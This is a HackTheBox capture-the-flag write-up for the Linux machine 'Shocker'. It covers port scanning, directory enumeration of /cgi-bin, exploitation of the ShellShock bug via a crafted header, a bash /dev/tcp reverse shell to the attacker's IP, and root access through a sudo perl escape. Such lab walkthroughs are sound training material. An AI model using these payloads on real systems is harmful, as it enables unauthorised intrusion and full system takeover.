---
title: Shocker
tags:
  - HackTheBox
  - Easy
  - Linux
  - ShellShock
  - Sudo-Vulnerability
date: 2024-09-02T00:00:00Z
---
![](Pasted%20image%2020241102105019.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.56 shocker.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- shocker.htb > sC.txt

[redacted]
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  EtherNetIP-1
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
```

So I decided to take a look at the webpage:

![](Pasted%20image%2020241102105723.png)

There’s a misconfiguration on Shocker that’s worth understanding. Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash. But in this case, there is a directory on Shocker that sends a 404 Not Found with visited without the trailing slash.

Tools like [dirsearch 📁](/notes/tools/dirsearch.md) and [Dirb 📢](/notes/tools/Dirb.md) actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash. This is really helpful in a case like shocker, but will double the amount of requests sent (and thus time) each time there’s a scan. Both [Gobuster 🐦](/notes/tools/Gobuster.md) and `feroxbuster` have a `-f` flag to force adding the `/` to the end of directories. For Shocker, running with `-f` does find something else:

```shell
gobuster dir -u http://shocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -f

[redacted]
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
```

```shell
dirsearch -e php,sh -u http://shocker.htb/cgi-bin

[redacted]
[11:25:49] 200 -  119B  - /cgi-bin/user.sh
```

So I checked that script:

![](Pasted%20image%2020241102112703.png)

It seems that this script outputs the linux command `uptime`.

## Exploitation

[ShellShock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), AKA Bashdoor or CVE-2014-6271, was a vulnerability in Bash discovered in 2014 which has to do with the Bash syntax for defining functions. It allowed an attacker to execute commands in places where it should only be doing something safe like defining an environment variable. An initial POC was this:

```shell
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

This was a big deal because lots of different programs would take user input and use it to define environment variables, the most famous of which was CGI-based web servers. For example, it’s very typically to store the User-Agent string in an environment variable. And since the UA string is completely attacker controlled, this led to remote code execution on these systems.

> *I got inspired by this website: [sevenlayers.com](https://www.sevenlayers.com/index.php/125-exploiting-shellshock)*, then I created this note

So I decided to intercept the request and send a shellshock payload. I tested this payload:

```shell
() { :;}; echo; /usr/bin/id
```

![](Pasted%20image%2020241102113716.png)

So it's time for a reverse shell:

```shell
() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.16/666 0>&1
```

> Got it!

![](Pasted%20image%2020241102114023.png)

I can now read the user flag:

![](Pasted%20image%2020241102114227.png)

## Privilege escalation

if we run `sudo -l`:

```shell
sudo -l

Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

So we can run as sudo without password a perl privileged reverse shell. As [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) says:

> [!Info]
> If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```shell
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

> We are root now!:

![](Pasted%20image%2020241102114629.png)

==Machine pwned!==

